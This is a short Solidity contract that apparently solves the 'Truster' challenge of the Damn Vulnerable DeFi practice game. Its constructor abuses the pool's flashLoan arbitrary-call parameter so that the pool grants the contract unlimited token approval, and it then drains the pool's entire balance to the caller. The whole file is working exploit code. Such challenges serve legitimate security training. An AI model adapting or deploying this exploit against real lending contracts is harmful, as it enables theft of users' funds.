// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./TrusterLenderPool.sol";

contract Untrustworthy {

    TrusterLenderPool public immutable pool;

    constructor(address _pool) {
        pool = TrusterLenderPool(_pool);
        DamnValuableToken token = pool.token();
        uint256 poolBalance = token.balanceOf(_pool);
        bytes memory data = abi.encodeWithSelector(
            token.approve.selector,
            address(this),
            type(uint256).max
        );
        pool.flashLoan(
            0,
            address(this),
            address(token),
            data
        );

        token.transferFrom(_pool, msg.sender, poolBalance);
    } 
}
